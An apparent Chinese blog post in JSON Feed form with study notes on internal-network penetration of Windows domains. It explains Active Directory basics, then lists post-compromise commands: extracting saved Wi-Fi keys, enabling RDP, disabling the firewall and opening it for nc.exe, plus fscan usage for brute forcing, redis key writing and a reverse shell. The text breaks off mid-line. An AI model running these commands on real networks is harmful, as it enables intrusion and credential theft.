{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"内网\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/12/25/%E5%86%85%E7%BD%91/",
            "url": "http://example.com/2022/12/25/%E5%86%85%E7%BD%91/",
            "title": "内网渗透",
            "date_published": "2022-12-25T05:38:45.000Z",
            "content_html": "<h1 id=\"内网\"><a class=\"markdownIt-Anchor\" href=\"#内网\">#</a> 内网</h1>\n<p><strong>域基础知识，信息收集，密码抓取，内网横向，域控安全，跨域攻击</strong></p>\n<h2 id=\"域基础知识\"><a class=\"markdownIt-Anchor\" href=\"#域基础知识\">#</a> 域基础知识</h2>\n<h3 id=\"活动目录\"><a class=\"markdownIt-Anchor\" href=\"#活动目录\">#</a> 活动目录</h3>\n<p>活动目录 (Active Directory,AD) 是指域环境中提供目录服务的组件</p>\n<p>目录用于存储有关网络对象 (例如用户、组、计算机、共享资源、打印机和联系人等) 的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了 目录服务，为企业提供了网络环境的集中式管理机制</p>\n<p>活动目录的逻辑结构包括前面讲过的组织单元 (OU)、域、域树、域森林。域树内的所有域 共享一个活动目录，这个活动目录内的数据分散存储在各个域中，且每个域只存储该域内的数据。</p>\n<p>活动目录主要提供以下功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。</span><br><span class=\"line\">软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。</span><br><span class=\"line\">环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。</span><br><span class=\"line\">更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。</span><br><span class=\"line\">活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台</span><br></pre></td></tr></table></figure>\n<p>组织单元</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略</span><br></pre></td></tr></table></figure>\n<p><strong>委派控制</strong></p>\n<p>因为财务部门有 20 个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表，让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p>\n<p>grant … 权限 …</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203143640363.png\" alt=\"image-20221203143640363\"></p>\n<p>如果需要委派的人较多，那么我们可以新建组，用户加组，对该组进行委派</p>\n<h3 id=\"域内权限\"><a class=\"markdownIt-Anchor\" href=\"#域内权限\">#</a> 域内权限</h3>\n<p>组</p>\n<p>组 (Group) 是用户账号的集合。通过向组分配权限，就可以不必向每个用户分别分配权限。例如，管理员在日常工作中，不必为单个用户账号设置独特的访问权限，只需要将用户账放到相应的安全组中。管理员通过配置安全组访问权限，就可以为所有加入安全组的用户账号配置同样的权限。使用安全组而不是单个的用户账号，可以大大简化网络的维护和管理工作</p>\n<p><strong>域本地组</strong></p>\n<p>域本地组成员来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组，在本域范围内可用。</p>\n<p><strong>全局组</strong></p>\n<p>全局组成员来自于同一域的用户账户和全局组，在林范围内可用</p>\n<p><strong>通用组</strong></p>\n<p>通用组成员来自林中任何域中的用户账户、全局组和其他的通用组，在全林范围内可用</p>\n<p>域本地组来自全林，作用于本域；</p>\n<p>全局组来自本域，作用于全林；</p>\n<p>通用组来自林，作用于全林。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203150027803.png\" alt=\"image-20221203150027803\" style=\"zoom: 33%;\" />\n<p><strong>A-G-DL-P 策略</strong></p>\n<p>A-G-DL-P 策略是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>\n<p>A 表示用户账号 (Account)</p>\n<p>G 表示全局组 (Global Group)</p>\n<p>U 表示通用组 (Universal Group)</p>\n<p>DL 表示域本地组 (Domain Local Group)</p>\n<p>P 表示资源权限 (Permission, 许可)</p>\n<p>按照 AG-DL-P 策略对用户进行组织和管理是非常容易的。在 AGDL-P 策略形成以后，当需要给一个用户添加某个权限时，只要把这个用户添加到某个本地域组中就可以了。</p>\n<p>A -&gt; G -&gt;DL -&gt; P</p>\n<h3 id=\"安全域划分\"><a class=\"markdownIt-Anchor\" href=\"#安全域划分\">#</a> 安全域划分</h3>\n<p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。这个网段内的计算机拥 有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 ，从而对允许哪些 IP 地址访问此域、允许此域访问哪些 IP 地址和网段进行设置。这些 措施，将使得网络风险最小化，当攻击发生时，可以尽可能地将威胁隔离，从而降低对域内计算机的影响。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203152306469.png\" alt=\"image-20221203152306469\"></p>\n<p>在一个用路由器连接的内网中，可以将网络划分为三个区域:</p>\n<p>安全级别最高的内网；</p>\n<p>安全级别中等的 DMZ;</p>\n<p>安全级别最低的外网</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。</span><br><span class=\"line\">内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器</span><br><span class=\"line\">外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行)</span><br><span class=\"line\">外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</span><br><span class=\"line\">DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</span><br><span class=\"line\">DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作。</span><br></pre></td></tr></table></figure>\n<h2 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>攻击流程详解</p>\n<p>信息收集 - 漏洞利用 - 权限提升 - 权限维持 - 隧道技术 - 内网渗透</p>\n<p>下面建立在你有 shell，你把人家上了的情况</p>\n<h3 id=\"收集本机信息\"><a class=\"markdownIt-Anchor\" href=\"#收集本机信息\">#</a> 收集本机信息</h3>\n<h4 id=\"查看基本信息\"><a class=\"markdownIt-Anchor\" href=\"#查看基本信息\">#</a> 查看基本信息</h4>\n<p>1. 收集网络信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ipconfig</span><br></pre></td></tr></table></figure>\n<p>2. 收集操作系统和软件信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>\n<p>3. 查看系统体系结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>\n<p>4. 查看安装软件及版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell wmic product get name,version</span><br><span class=\"line\">shell powershell &quot;Get‐WmiObject ‐class win32_product | Select‐Object ‐Property name,version&quot;</span><br></pre></td></tr></table></figure>\n<p>5. 查看本机服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic service list brief</span><br></pre></td></tr></table></figure>\n<p>6. 查看进程信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">wmic process list brief</span><br></pre></td></tr></table></figure>\n<p>7. 开机自启程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic startup get command,caption</span><br></pre></td></tr></table></figure>\n<p>8. 查看计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chcp 437</span><br><span class=\"line\">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>\n<p>9. 查看开机时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net statistics workstation</span><br></pre></td></tr></table></figure>\n<p>10. 查看用户列表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user</span><br><span class=\"line\">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure>\n<p>11. 列出会话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net session </span><br></pre></td></tr></table></figure>\n<p>12. 列出连接信息，端口信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -ano</span><br></pre></td></tr></table></figure>\n<p>13. 查看补丁信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>\n<p>14. 查看共享</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net share</span><br><span class=\"line\">wmic share get name,path,status</span><br></pre></td></tr></table></figure>\n<p>15. 查路由</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route print</span><br></pre></td></tr></table></figure>\n<p>16. 查 ARP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br></pre></td></tr></table></figure>\n<p>17. 开启远程服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class=\"line\"></span><br><span class=\"line\">//2003之后</span><br><span class=\"line\">#开启</span><br><span class=\"line\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 00000000 /f </span><br><span class=\"line\">#关闭</span><br><span class=\"line\">REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 11111111 /f </span><br></pre></td></tr></table></figure>\n<p>18 收集 wifi 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr ‐i ‐v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>\n<p>19. 修改 RDP 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP‐Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure>\n<p>20. 查看代理信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;</span><br></pre></td></tr></table></figure>\n<p>21. 查看登录凭证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmdkey /l</span><br></pre></td></tr></table></figure>\n<p>22. 查询用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup</span><br></pre></td></tr></table></figure>\n<p>23. 查询管理员组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup administrators</span><br><span class=\"line\"></span><br><span class=\"line\">如果电脑加入域后，与中domain admins 是默认管理员</span><br></pre></td></tr></table></figure>\n<p>24. 查看最近打开文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir %APPDATA%\\Microsoft\\Windows\\Recent</span><br></pre></td></tr></table></figure>\n<p>25. 杀软查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /node:localhost /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure>\n<h4 id=\"防火墙操作\"><a class=\"markdownIt-Anchor\" href=\"#防火墙操作\">#</a> 防火墙操作</h4>\n<p>1. 查看防火墙状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show state</span><br></pre></td></tr></table></figure>\n<p>2. 关闭防火墙</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall set opmode disable  //2003之前</span><br><span class=\"line\">netsh advfirewall set allprofiles state off   //优先使用</span><br></pre></td></tr></table></figure>\n<p>3. 查看防火墙配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show config</span><br></pre></td></tr></table></figure>\n<p>4. 修改防火墙配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//允许指定的程序进行全部的连接</span><br><span class=\"line\">netsh firewall add allowedprogram c:\\nc.exe &quot;allownc&quot; enable   //2003之前</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;    //2003之后</span><br><span class=\"line\"></span><br><span class=\"line\">//允许相应端口</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow protocol=tcp localport=4444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow program=c:\\a.exe </span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow protocol=tcp localport=444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow program=c:\\a.exe</span><br><span class=\"line\"></span><br><span class=\"line\">//允许指定 程序退出</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自动化收集信息\"><a class=\"markdownIt-Anchor\" href=\"#自动化收集信息\">#</a> 自动化收集信息</h3>\n<p>bat 语法：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.终端输出</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"number\">2</span>.暂停,等待按键继续</span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br><span class=\"line\"><span class=\"number\">3</span>.不显示后续命令行及当前命令行</span><br><span class=\"line\"><span class=\"built_in\">echo</span> off</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">4</span>.显示命令，分多个提示符显示</span><br><span class=\"line\"><span class=\"built_in\">echo</span> on</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">5</span>.只显示结果,在每个命令行的最前面，表示运行时不显示这一行的命令行</span><br><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"number\">6</span>.调用另一个bat</span><br><span class=\"line\"><span class=\"keyword\">call</span> c:\\<span class=\"number\">2</span>.bat</span><br><span class=\"line\"><span class=\"number\">7</span>.注释</span><br><span class=\"line\"><span class=\"comment\">rem</span></span><br><span class=\"line\"><span class=\"number\">8</span>.输出到文件</span><br><span class=\"line\">whoami &gt; <span class=\"number\">1</span>.txt</span><br><span class=\"line\"><span class=\"number\">9</span>.追加</span><br><span class=\"line\"><span class=\"built_in\">ipconfig</span> &gt;&gt; <span class=\"number\">2</span>.txt</span><br></pre></td></tr></table></figure>\n<p>一个简单的脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@echo off</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">ipconfig &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo| findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">echo %PROCESSOR_ARCHITECTURE% &gt;&gt;1.txt</span><br></pre></td></tr></table></figure>\n<p>擦，大哥写的脚本</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /f &quot;delims=&quot; <span class=\"variable\">%%A</span> <span class=\"keyword\">in</span> (&#x27;<span class=\"built_in\">dir</span> /s /b <span class=\"variable\">%WINDIR%</span>\\system32\\*htable.xsl&#x27;) <span class=\"keyword\">do</span> <span class=\"built_in\">set</span> &quot;var=<span class=\"variable\">%%A</span>&quot;</span><br><span class=\"line\">wmic process get CSName,Description,ExecutablePath,ProcessId /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic USERACCOUNT list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic group list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic volume get <span class=\"built_in\">Label</span>,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic netuse list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic startup get Caption,Command,Location,User /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic Timezone get DaylightName,Description,StandardName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>\n<h3 id=\"内网ip扫描\"><a class=\"markdownIt-Anchor\" href=\"#内网ip扫描\">#</a> 内网 IP 扫描</h3>\n<p>1.netbios</p>\n<p>这是一款用于扫描 Windows 网络上 NetBIOS 名字信息的程序。该程序对给出范围内的每一个地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan 列出它的 IP 地址、NetBIOS 计算机名、登录用户名和 MAC 地址。但只能用于局域网，NBTSCAN 可以取到 PC 的真实 IP 地址和 MAC 地址，如果有”ARP 攻击” 在做怪，可以找到装有 ARP 攻击的 PC 的 IP / 和 MAC 地址。但只能用于局域网</p>\n<blockquote>\n<p>nbtscan.exe + IP</p>\n</blockquote>\n<p>2.ICMP</p>\n<p>还可以利用 ICMP 协议探测内网。依次对内网中的每个 IP 地址执行 ping 命令，可以快速找出内网中所有存活酌主机。在渗透测试中中，可以使用如下命令循环探测整个 C 段</p>\n<blockquote>\n<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=”</p>\n</blockquote>\n<p>3.arp</p>\n<blockquote>\n<p>apr -t IP</p>\n</blockquote>\n<p>4.Kscan</p>\n<p>kscan 是一款资产测绘工具，可针对指定资产进行端口扫描以及 TCP 指纹识别和 Banner 抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解，且是 go 平台首款开源的 RDP 暴力破解工具</p>\n<blockquote>\n<p>kscan.exe -t 192.168.13.0/24 --encoding  utf-8</p>\n</blockquote>\n<p>其他用法: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xjdnZ2di9rc2Nhbg==\">https://github.com/lcvvvv/kscan</span></p>\n<blockquote>\n<p>-t , --target 指定探测对象：</p>\n<p>IP 地址：114.114.114.114</p>\n<p>IP 地址段：114.114.114.114/24, 不建议子网掩码小于 12</p>\n<p>IP 地址段：114.114.114.114-115.115.115.115</p>\n<p>URL 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\">https://www.baidu.com</span></p>\n<p>文件地址：file:/tmp/target.txt</p>\n<p>–spy 网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为：</p>\n<p>(空)、192、10、172、all、指定 IP 地址 (将探测该 IP 地址 B 段存活网关)</p>\n</blockquote>\n<p>5.fscan</p>\n<p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能。</p>\n<blockquote>\n<p>fscan.exe -h 192.168.13.0/24</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class=\"line\">fscan.exe -hf ip.txt (以文件导入)</span><br><span class=\"line\">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web 